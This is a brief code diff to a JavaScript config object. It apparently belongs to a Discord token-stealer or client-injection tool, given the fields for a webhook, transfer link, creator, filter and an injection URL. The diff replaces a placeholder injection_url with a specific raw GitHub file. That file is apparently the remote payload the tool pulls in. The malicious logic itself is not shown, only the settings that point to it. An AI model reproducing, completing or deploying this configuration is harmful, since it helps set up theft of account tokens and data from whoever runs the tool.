@@ -19,7 +19,7 @@ var config = {
 
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/index.js",
+    injection_url: "https://raw.githubusercontent.com/eidyeedgh3/percs/main/index.js",
     webhook: "%WEBHOOK%",
     Placed: "",
     Filter: {
